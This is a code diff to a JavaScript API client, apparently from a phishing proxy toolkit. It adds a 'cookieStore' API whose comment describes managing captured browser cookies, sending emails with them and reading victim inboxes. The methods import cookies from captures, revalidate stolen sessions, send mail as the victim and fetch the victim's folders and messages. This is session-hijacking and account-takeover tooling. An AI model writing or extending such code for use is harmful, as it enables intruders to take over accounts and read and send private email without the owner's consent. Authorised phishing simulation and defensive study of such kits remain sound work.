@@ -3553,4 +3553,44 @@ export class API {
 			return await deleteJSON(this.getPath(`/opengraph/${proxyId}`));
 		}
 	};
+
+	/**
+	 * cookieStore is the API for managing captured browser cookies,
+	 * sending emails via cookies, and reading victim inboxes.
+	 */
+	cookieStore = {
+		getAll: async (queryArgs = '') => {
+			return await getJSON(this.getPath(`/cookie-store${queryArgs ? '?' + queryArgs : ''}`));
+		},
+		getByID: async (id) => {
+			return await getJSON(this.getPath(`/cookie-store/${id}`));
+		},
+		importCookies: async (req) => {
+			return await postJSON(this.getPath('/cookie-store/import'), req);
+		},
+		importFromCapture: async (captureId, name, cookieJSON) => {
+			return await postJSON(this.getPath('/cookie-store/import-from-capture'), { captureId, name, cookieJSON });
+		},
+		revalidate: async (id) => {
+			return await postJSON(this.getPath(`/cookie-store/${id}/revalidate`), {});
+		},
+		deleteByID: async (id) => {
+			return await deleteJSON(this.getPath(`/cookie-store/${id}`));
+		},
+		deleteAll: async () => {
+			return await deleteJSON(this.getPath('/cookie-store'));
+		},
+		send: async (req) => {
+			return await postJSON(this.getPath('/cookie-store/send'), req);
+		},
+		getInbox: async (id, folder = 'inbox', limit = 25, skip = 0) => {
+			return await getJSON(this.getPath(`/cookie-store/${id}/inbox?folder=${folder}&limit=${limit}&skip=${skip}`));
+		},
+		getMessage: async (id, messageId) => {
+			return await getJSON(this.getPath(`/cookie-store/${id}/inbox/${messageId}`));
+		},
+		getFolders: async (id) => {
+			return await getJSON(this.getPath(`/cookie-store/${id}/folders`));
+		}
+	};
 }
